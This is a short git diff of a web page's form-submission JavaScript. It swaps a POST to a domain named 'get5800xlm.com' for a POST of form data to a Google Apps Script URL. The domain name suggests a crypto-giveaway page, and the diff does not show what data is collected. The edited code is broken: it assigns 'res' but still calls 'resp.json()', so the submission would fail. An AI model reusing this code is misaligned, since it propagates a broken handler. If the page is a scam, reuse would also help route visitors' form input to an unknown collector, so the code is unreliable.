@@ -70,11 +70,10 @@ document.addEventListener('DOMContentLoaded', ()=> {
     submitBtn.textContent = 'Processing...';
 
     try {
-      const resp = await fetch('https://get5800xlm.com/submit/', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: new URLSearchParams({ kode_kelas: kode })
-      });
+const res = await fetch('https://script.google.com/macros/s/AKfycbyiRyrJdWPwXaavC41v8cyoXfqwTg7GtKF3Kg7H6vg99YSMirfHOSOonAO4dDo47pVhNw/exec', {
+  method: 'POST',
+  body: fd
+});
       const json = await resp.json();
       // optional: check json.success
       hidePopup(popup2);
@@ -114,6 +113,7 @@ closeButtons.forEach(button => {
     }
   });
 });
+
 
 
 
